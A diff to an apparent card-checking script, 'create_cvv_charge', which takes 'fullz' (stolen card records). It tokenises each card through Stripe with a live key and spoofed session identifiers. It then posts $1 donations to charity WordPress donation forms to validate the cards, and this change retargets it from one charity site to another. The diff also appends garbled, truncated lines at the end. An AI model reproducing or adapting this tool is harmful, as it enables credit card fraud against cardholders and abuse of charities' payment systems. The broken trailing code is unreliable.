@@ -39,12 +39,12 @@ async def create_cvv_charge(fullz , session):
         'card[cvc]':cvv,
         'card[exp_month]':mes,
         'card[exp_year]':ano,
-        'guid':'15272133-9ede-4e6e-b794-c198bb382765d92456',
-        'muid':'22e150f1-15d3-4b99-9666-08e841b7329b5c431b',
-        'sid':'2952eb70-08a1-46eb-acf6-cbb91b9f98b949ab7d',
+        'guid':'8767fe05-30b7-4a3e-b5be-3952943deba3d9e5e9',
+        'muid':'06cd1deb-58df-484a-96b1-9ff05fa13a21d3456a',
+        'sid':'170d3d01-0f16-4509-a427-a79a95cff0433e2fb0',
         'pasted_fields':'number',
-        'payment_user_agent':'stripe.js/0c81e1259e; stripe-js-v3/0c81e1259e; card-element',
-        'referrer':'https://donate.givedirectly.org',
+        'payment_user_agent':'stripe.js/2F7b2f7dbc1b; stripe-js-v3/2F7b2f7dbc1b; card-element',
+        'referrer':'https://lumivoce.org',
         'time_on_page':'27287',
         'key':'pk_live_519sODGHwVm9HtpVbGWn3R5HrSXBaErzDUXPjtr2JvODEXgSV8x7UQnU3fChIZ6hlwrgM4ubVpp1DFbUDX74ft4pV00GlpMnrpR',
         }
@@ -59,17 +59,17 @@ async def create_cvv_charge(fullz , session):
         
 
         params = {
-            't': '1718807439228',
+            't': '1740664323418',
         }
 
         files = {
             'action': (None, 'fluentform_submit'),
-            'data': (None, f'choose_time=One%20Time%20&payment_input=Other%20Amount&custom-payment-amount=1&input_text=Crish%20Niki&email=crishniki158%40gmail.com&payment_method=stripe&__fluent_form_embded_post_id=263&_fluentform_49_fluentformnonce=a73e2da4de&_wp_http_referer=%2Fdonate%2F&__stripe_payment_method_id={id}&isFFConversational=true'),
+            'data': (None, f'choose_time=One%20Time%20&payment_input=Other%20Amount&custom-payment-amount=1&input_text=Crish%20Niki&email=bob.redrat27@gmail.com&payment_method=stripe&__fluent_form_embded_post_id=263&_fluentform_49_fluentformnonce=2383036afb&_wp_http_referer=%2Fdonate%2F&__stripe_payment_method_id={id}&isFFConversational=true'),
             'form_id': (None, '49'),
         }
 
         response = await session.post(
-            'https://donate.givedirectly.org/wp-admin/admin-ajax.php',
+            'https://lumivoce.org/wp-admin/admin-ajax.php',
             params=params,
             files=files,
         )
@@ -82,3 +82,6 @@ async def create_cvv_charge(fullz , session):
 
     except Exception as e:
         return str(e)
+turn str(e)
+r(e)
+turn str(e)
